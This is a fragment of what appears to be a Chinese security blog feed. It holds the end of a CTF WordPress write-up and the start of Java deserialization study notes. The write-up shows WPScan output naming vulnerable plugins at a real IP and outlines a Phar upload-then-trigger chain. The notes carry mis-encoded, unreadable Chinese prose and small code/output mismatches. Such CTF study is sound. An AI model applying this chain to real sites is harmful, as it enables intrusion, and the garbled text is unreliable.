</span>|<span class="hljs-string"> Confidence: 60%</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress version 6.4.1 identified (Insecure, released on 2023-11-09).</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Emoji Settings (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/, Match: &#x27;wp-includes\/js\/wp-emoji-release.min.js?ver=6.4.1&#x27;</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confirmed By: Meta Generator (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/, Match: &#x27;WordPress 6.4.1&#x27;</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] 1 vulnerability identified:</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: WP 6.4-6.4.1 - POP Chain</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 6.4.2</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/2afcb141-c93c-4244-bde4-bf5c9759e8a3</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://fenrisk.com/publications/blogpost/2023/11/22/gadgets-chain-in-wordpress/</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] WordPress theme in use: twentytwentyfour</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://124.71.184.68:8012/wp-content/themes/twentytwentyfour/</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Readme: http://124.71.184.68:8012/wp-content/themes/twentytwentyfour/readme.txt</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Style URL: http://124.71.184.68:8012/wp-content/themes/twentytwentyfour/style.css</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> The version could not be determined.</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] Enumerating All Plugins (via Passive Methods)</span><br><span class="hljs-string">[+] Checking Plugin Versions (via Passive and Aggressive Methods)</span><br><span class="hljs-string"></span><br><span class="hljs-string">[i] Plugin(s) Identified:</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] all-in-one-video-gallery</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://124.71.184.68:8012/wp-content/plugins/all-in-one-video-gallery/</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-09-01T08:47:00.000Z</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 3.5.2</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] 2 vulnerabilities identified:</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: All-in-One Video Gallery 2.5.8 - 2.6.0 - Unauthenticated Arbitrary File Download &amp; SSRF</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 2.6.1</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/852c257c-929a-4e4e-b85e-064f8dadd994</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-2633</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: Freemius SDK &lt; 2.5.10 - Reflected Cross-Site Scripting</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 3.4.3</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/7fd1ad0e-9db9-47b7-9966-d3f5a8771571</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-33999</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Version: 2.6.0 (80% confidence)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/wp-content/plugins/all-in-one-video-gallery/README.txt</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] contact-form-7</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://124.71.184.68:8012/wp-content/plugins/contact-form-7/</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-12-19T04:49:00.000Z</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 5.8.5</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Version: 5.8.4 (90% confidence)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Query Parameter (Passive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/wp-content/plugins/contact-form-7/includes/css/styles.css?ver=5.8.4</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Confirmed By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/wp-content/plugins/contact-form-7/readme.txt</span><br><span class="hljs-string"></span><br><span class="hljs-string">[+] drag-and-drop-multiple-file-upload-contact-form-7</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Location: http://124.71.184.68:8012/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Last Updated: 2023-12-05T07:37:00.000Z</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> [!] The version is out of date, the latest version is 1.3.7.4</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Found By: Urls In Homepage (Passive Detection)</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] 4 vulnerabilities identified:</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: Drag and Drop Multiple File Upload - Contact Form 7 &lt; 1.3.6.3 - Unauthenticated Stored XSS</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 1.3.6.3</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/1b849957-eaca-47ea-8f84-23a3a98cc8de</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0595</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://plugins.trac.wordpress.org/changeset/2686614</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: Drag and Drop Multiple File Upload &lt; 1.3.6.5 - File Upload Size Limit Bypass</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 1.3.6.5</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/035dffef-4b4b-4afb-9776-7f6c5e56452c</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3282</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: Drag and Drop Multiple File Upload â€“ Contact Form 7 &lt; 1.3.6.6 - File Upload and File deletion via CSRF</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 1.3.6.6</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/e6a76476-e086-473d-bc1e-3264c85b2441</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-45364</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> [!] Title: Drag and Drop Multiple File Upload - Contact Form 7 &lt; 1.3.7.4 - Unauthenticated Arbitrary File Upload</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     Fixed in: 1.3.7.4</span><br><span class="hljs-string"> </span>|<span class="hljs-string">     References:</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://wpscan.com/vulnerability/d758ce63-73fb-46a6-9cc7-c114db2e2512</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-5822</span><br><span class="hljs-string"> </span>|<span class="hljs-string">      - https://www.wordfence.com/threat-intel/vulnerabilities/id/1b3be300-5b7f-4844-8637-1bb8c939ed4c</span><br><span class="hljs-string"> </span>|<br> |<span class="hljs-string"> Version: 1.3.6.2 (80% confidence)</span><br><span class="hljs-string"> </span>|<span class="hljs-string"> Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="hljs-string"> </span>|<span class="hljs-string">  - http://124.71.184.68:8012/wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/readme.txt</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼š</p><p><img src="/img/ezwordpress1.png" alt="ezwordpress1"></p><p><img src="/img/ezwordpress2.png" alt="ezwordpress2"></p><p><img src="/img/ezwordpress3.png" alt="ezwordpress3"></p><p><a href="https://wpscan.com/vulnerability/1b849957-eaca-47ea-8f84-23a3a98cc8de/">æ–‡ä»¶ä¸Šä¼ </a>: ä¸Šä¼ <code>Phar</code>ç±»å‹æ–‡ä»¶</p><p><a href="https://wpscan.com/vulnerability/852c257c-929a-4e4e-b85e-064f8dadd994/">æ–‡ä»¶ä¸‹è½½</a>ï¼šè§¦å‘<code>Phar</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaå®‰å…¨åˆæ¢_ååºåˆ—åŒ–åŸºç¡€</title>
    <link href="/2023/12/30/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/12/30/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>å­¦ä¹ ç¬”è®°</p><span id="more"></span><hr><blockquote><p>æœ€è¿‘å¼€äº†ä¸ªæ–°å‘ï¼šjavaå®‰å…¨ï¼Œéšä¾¿å†™ç‚¹ç¬”è®°</p></blockquote><h3 id="0x01-ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ"><a href="#0x01-ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ" class="headerlink" title="0x01 ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ"></a>0x01 ä»€ä¹ˆæ˜¯åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Ÿ</h3><p>â€‹ç®€å•è¯´å°±æ˜¯è®©æ•°æ®ä»¥æµçš„å½¢å¼åœ¨ç½‘ç»œä¸Šä¼ è¾“(æ¯”å¦‚ä¸¤ä¸ªå¯¹è±¡ä¹‹é—´)æˆ–è€…è¢«å­˜å‚¨ä»‹è´¨å­˜å‚¨ã€‚åºåˆ—åŒ–å°†å¯¹è±¡è½¬æ¢ä¸ºå­—èŠ‚æµï¼Œååºåˆ—åŒ–å°†å­—èŠ‚æµè½¬æ¢ä¸ºæ•°æ®ã€‚æ¯”å¦‚ï¼šAç»™Bæ‰“ç”µè¯ï¼Œæˆ‘ä»¬éœ€è¦æŠŠå£°éŸ³ä¿¡å·è½¬æ¢æˆç”µ&#x2F;å…‰ç­‰ä¿¡å·ä¼ è¾“ï¼Œç„¶åæ”¶æ–¹å†æŠŠç”µ&#x2F;å…‰ä¿¡å·ç­‰è¿˜åŸæˆå£°éŸ³ä¿¡å·ã€‚</p><p>â€‹å½“å¯¹è±¡è¢«åºåˆ—åŒ–æ—¶ï¼Œå®ƒçš„çŠ¶æ€è¢«è½¬æ¢ä¸ºå­—èŠ‚æµå¹¶ä¿å­˜èµ·æ¥ã€‚è¿™æ„å‘³ç€å³ä½¿ç¨‹åºç»“æŸæˆ–å…³é—­ï¼Œå¯¹è±¡çš„çŠ¶æ€ä»ç„¶å¯ä»¥è¢«ä¿ç•™ã€‚å½“éœ€è¦é‡æ–°ä½¿ç”¨å¯¹è±¡æ—¶ï¼Œå¯ä»¥é€šè¿‡ååºåˆ—åŒ–å°†å­—èŠ‚æµè½¬æ¢å›å¯¹è±¡ï¼Œå¹¶æ¢å¤å¯¹è±¡çš„çŠ¶æ€ã€‚</p><p>â€‹<code>Java</code> ä¸­è¢«åˆ›å»ºçš„å¯¹è±¡çš„å£°æ˜å‘¨æœŸä¸€èˆ¬ä¸ä¼šæ¯”<code> JVM</code> çš„è¿è¡Œå‘¨æœŸæ›´é•¿ï¼Œ<code>JVM </code> è¿è¡Œç»“æŸä»¥åï¼Œå…¶åˆ›å»ºçš„å¯¹è±¡ä¹Ÿå°±æ¶ˆå¤±äº†ã€‚ä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æƒ³è¦è¾¾åˆ°ä¸€ç§æ•ˆæœï¼Œå³å³ä½¿<code>JVM</code> ç»“æŸè¿è¡Œäº†ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥ç”¨åˆ°ä¹‹å‰æ‰€åˆ›å»ºçš„å¯¹è±¡ï¼Œæˆ–è€…è¯´ï¼Œæˆ‘ä»¬æƒ³è¦å°†ä¹‹å‰åˆ›å»ºçš„å¯¹è±¡ä¿å­˜ä¸‹æ¥ï¼Œä»¥ä¾¿è¿›è¡Œä¼ è¾“ï¼Œæ›´æˆ–è€…è¯´ï¼Œè®©ä¹‹å‰<code>JVM </code>æ‰€åˆ›å»ºçš„å¯¹è±¡èƒ½å¤Ÿåœ¨å¦ä¸€ä¸ª<code> JVM</code> ä¸­è¿è¡Œã€‚è¦è¾¾åˆ°è¿™æ ·çš„åŠŸèƒ½ï¼Œå°±å¯ä»¥é‡‡ç”¨<code> Java</code> ä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶ã€‚</p><p>â€‹ä¸å…‰åœ¨<code>java</code>ä¸­ï¼Œ<code>phpã€python</code>å‡å­˜åœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼Œä¸‹é¢ä¸¾å‡ ä¸ªç®€å•æ —å­ã€‚</p><h3 id="0x02-php-python-javaä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#0x02-php-python-javaä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="0x02 php, python, javaä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>0x02 php, python, javaä¸­çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h3><ul><li>PHP</li></ul><p><strong>å†™è¿™æ®µ<code>PHP</code>çš„æ—¶å€™æ‰æ„è¯†åˆ°è‡ªå·±å·²ç»24å²äº†:)è¿˜ä¸å¤ªä¹ æƒ¯($this-&gt;age &#x3D; â€˜24â€™)</strong></p><p><strong>å¸Œæœ›æ—¶é—´è¿‡çš„æ…¢ç‚¹æ:)</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Notbad</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$gender</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;viper3&#x27;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;gender = <span class="hljs-string">&#x27;male&#x27;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-string">&#x27;24&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notbad</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br\&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span> (<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//O:6:&quot;Notbad&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;viper3&quot;;s:6:&quot;gender&quot;;s:4:&quot;male&quot;;s:3:&quot;age&quot;;s:2:&quot;23&quot;;&#125;</span><br>    <br><span class="hljs-comment">//object(Notbad)#2 (3) &#123;</span><br>  [<span class="hljs-string">&quot;name&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;viper3&quot;</span><br>  [<span class="hljs-string">&quot;gender&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;male&quot;</span><br>  [<span class="hljs-string">&quot;age&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;23&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>python</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªç±»</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):<br>        self.name = name<br>        self.age = age<br><br><span class="hljs-comment"># åˆ›å»ºä¸€ä¸ªPersonå¯¹è±¡</span><br>person = Person(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">25</span>)<br><br><span class="hljs-comment"># åºåˆ—åŒ–å¯¹è±¡</span><br>serialized_data = pickle.dumps(person)<br><br><span class="hljs-comment"># æ‰“å°åºåˆ—åŒ–åçš„å­—èŠ‚æµ</span><br><span class="hljs-built_in">print</span>(serialized_data)<br><br><span class="hljs-comment"># ååºåˆ—åŒ–å¯¹è±¡</span><br>deserialized_person = pickle.loads(serialized_data)<br><br><span class="hljs-comment"># æ‰“å°ååºåˆ—åŒ–åçš„å¯¹è±¡å±æ€§</span><br><br><span class="hljs-built_in">print</span>(deserialized_person.name)<br><span class="hljs-built_in">print</span>(deserialized_person.age)<br><br>/*<span class="hljs-string">b&#x27;\x80\x04\x95\x1b\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x06Person\x94\x93\x94)\x81\x94&#125;\x94(\x8c\x04name\x94\x8c\x05Alice\x94\x8c\x03age\x94K\x19ub.&#x27;</span><br>Alice<br><span class="hljs-number">25</span><br><br><span class="hljs-comment">#å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨Json.dumps()å‡½æ•°å°†å¯¹è±¡åºåˆ—åŒ–æˆJsonæ ¼å¼ï¼š</span><br><span class="hljs-keyword">import</span> json<br><br><span class="hljs-comment"># å®šä¹‰ä¸€ä¸ªå­—å…¸</span><br>data = &#123;<br>    <span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>,<br>    <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">25</span>,<br>    <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;New York&quot;</span><br>&#125;<br><br><span class="hljs-comment"># åºåˆ—åŒ–æ•°æ®ä¸ºå­—ç¬¦ä¸²</span><br>serialized_data = json.dumps(data)<br><br><span class="hljs-comment"># æ‰“å°åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²</span><br><span class="hljs-built_in">print</span>(serialized_data)<br><br><span class="hljs-comment">#</span><br>&#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-string">&quot;age&quot;</span>: <span class="hljs-number">25</span>, <span class="hljs-string">&quot;city&quot;</span>: <span class="hljs-string">&quot;New York&quot;</span>&#125;<br></code></pre></td></tr></table></figure><ul><li>java</li></ul><p>â€‹<code>Java</code>ååºåˆ—åŒ–çš„æ“ä½œï¼Œå¾ˆå¤šæ˜¯éœ€è¦å¼€å‘è€…æ·±å…¥å‚ä¸çš„ï¼Œå¤§é‡çš„åº“éƒ½ä¼šå®ç°<code>readObjectã€writeObject</code>æ–¹æ³•ï¼Œè¿™å’ŒPHPä¸­çš„<code>__wakeupã€__sleep</code>å¾ˆå°‘ä½¿ç”¨æ˜¯å­˜åœ¨é²œæ˜å¯¹æ¯”çš„ã€‚</p><p>â€‹<code>Java</code>åœ¨åºåˆ—åŒ–ä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œå°†ä¼šè°ƒç”¨è¿™ä¸ªå¯¹è±¡ä¸­çš„<code>writeObject</code>æ–¹æ³•ï¼Œå‚æ•°ç±»å‹æ˜¯<code>ObjectOutputStream</code>ï¼Œå¼€å‘è€…å¯ä»¥å°†ä»»ä½•å†…å®¹å†™å…¥è¿™ä¸ªæµå½“ä¸­ï¼Œååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨<code>readObject</code>ï¼Œå¼€å‘è€…ä¹Ÿå¯ä»¥ä»ä¸­è¯»å–å‰é¢å†™å…¥çš„å†…å®¹ï¼Œå¹¶è¿›è¡Œå¤„ç†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//å‚è€ƒäº†mochu7å¸ˆå‚…çš„æ–‡ç« </span><br><span class="hljs-keyword">package</span> StudyUnserialiation;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<span class="hljs-comment">//Serializableæ˜¯ä¸€ä¸ªæ ‡è®°æ¥å£ï¼Œç”¨äºæ ‡è¯†ä¸€ä¸ªç±»å¯ä»¥è¢«åºåˆ—åŒ–</span><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<span class="hljs-comment">//implementsæ˜¯ä¸€ä¸ªå…³é”®å­—ï¼Œç”¨äºè¡¨ç¤ºä¸€ä¸ªç±»å®ç°äº†ä¸€ä¸ªæ¥å£ã€‚</span><br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        s.defaultWriteObject();<br>        s.writeObject(<span class="hljs-string">&quot;This is Object&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        s.defaultReadObject(); <br>        s.readObject();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> (String) s.readObject();<br>        System.out.println(message);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><span class="hljs-comment">//é‡å†™</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//writeObjectå’ŒreadObjectæ–¹æ³•å¯ä»¥å®Œå…¨è‡ªå®šä¹‰ã€‚å½“ä¸€ä¸ªç±»å®ç°äº†Serializableæ¥å£æ—¶ï¼Œå®ƒå¯ä»¥é€‰æ‹©é‡å†™è¿™ä¸¤ä¸ªæ–¹æ³•æ¥è‡ªå®šä¹‰å¯¹è±¡çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿‡ç¨‹ã€‚</span><br><span class="hljs-comment">//writeObjectæ–¹æ³•ç”¨äºå°†å¯¹è±¡åºåˆ—åŒ–ä¸ºå­—èŠ‚æµã€‚å½“å¯¹è±¡è¢«åºåˆ—åŒ–æ—¶ï¼ŒwriteObjectæ–¹æ³•ä¼šè¢«è‡ªåŠ¨è°ƒç”¨ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå¯ä»¥è‡ªå®šä¹‰éœ€è¦åºåˆ—åŒ–çš„å­—æ®µå’Œé€»è¾‘ã€‚ä¾‹å¦‚ï¼Œå¯ä»¥åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹æŸäº›å­—æ®µè¿›è¡ŒåŠ å¯†æˆ–å‹ç¼©æ“ä½œã€‚</span><br><span 